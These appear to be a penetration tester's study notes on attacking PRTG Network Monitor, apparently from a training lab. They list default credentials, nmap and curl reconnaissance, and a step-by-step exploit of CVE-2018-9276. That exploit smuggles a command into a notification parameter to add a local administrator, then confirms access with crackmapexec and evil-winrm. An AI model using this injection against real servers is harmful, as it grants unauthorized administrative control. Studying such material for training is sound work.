---
aliases:
tags:
source:
  - https://www.paessler.com/prtg
desc: PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.
---


- It works with an autodiscovery mode to scan areas of a network and create a device list. Once this list is created, it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API. The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS.
- default credentials
	- `prtgadmin:prtgadmin`

# discovery

- found via nmap scan on port 8080
	- `sudo nmap -sV -p- --open -T4 10.129.201.50`
	  ```sh
		Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
		Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
		SYN Stealth Scan Timing: About 0.06% done
		Nmap scan report for 10.129.201.50
		Host is up (0.11s latency).
		Not shown: 65492 closed ports, 24 filtered ports
		Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
		PORT      STATE SERVICE       VERSION
		80/tcp    open  http          Microsoft IIS httpd 10.0
		135/tcp   open  msrpc         Microsoft Windows RPC
		139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp   open  microsoft-ds?
		3389/tcp  open  ms-wbt-server Microsoft Terminal Services
		5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		8000/tcp  open  ssl/http      Splunkd httpd
		8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
		8089/tcp  open  ssl/http      Splunkd httpd
		47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		49664/tcp open  msrpc         Microsoft Windows RPC
		49665/tcp open  msrpc         Microsoft Windows RPC
		49666/tcp open  msrpc         Microsoft Windows RPC
		49667/tcp open  msrpc         Microsoft Windows RPC
		49668/tcp open  msrpc         Microsoft Windows RPC
		49669/tcp open  msrpc         Microsoft Windows RPC
		49676/tcp open  msrpc         Microsoft Windows RPC
		49677/tcp open  msrpc         Microsoft Windows RPC
		Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
		
		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds	  
		  ```
	- [[eyewitness]]
		- finds default credentials
	- get version
		- `curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version`





# exploits

- https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html
- https://nvd.nist.gov/vuln/detail/CVE-2018-9276
	- prior 18.2.39
	- blog post about discovery https://www.codewatch.org/blog/?p=453
	- To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.
	  ![PRTG Network Monitor account settings page showing notifications tab with options for email and ticket notifications, and controls to test, pause, edit, clone, or delete notifications.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/prtg_notifications.png)
	- Next, click on `Add new notification`.
	  ![Add Notification page in PRTG Network Monitor showing settings for notification name 'pwn', status started, schedule none, and summarization method to send first DOWN and UP message ASAP, then summarize.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/prtg_add.png)
	  
	- Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. 
	- Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. 
	- Finally, in the parameter field, enter a command. 
		- For our purposes, we will add a new local admin user by entering 
		  `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add` 
		- click the `Save` button.
		  ![Notification settings with options to send email, push notification, SMS, and execute program with parameters for 'Demo exe notification - outfile.ps1'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/prtg_execute.png)
		- After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.
		  ![PRTG Network Monitor account settings showing notifications list with options to test, pause, edit, clone, or delete notifications, all marked as active.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/prtg_pwn.png)
		- scheduled the notification to run (and execute our command) at a later time when setting it up for persistence
		- Click `Test` and the account is created
		- confirm using crackmapexec
			- `sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!` 
		- connect
			- `evil-winrm -i 10.129.201.50 -u adam -p 'Password123!'`
		- 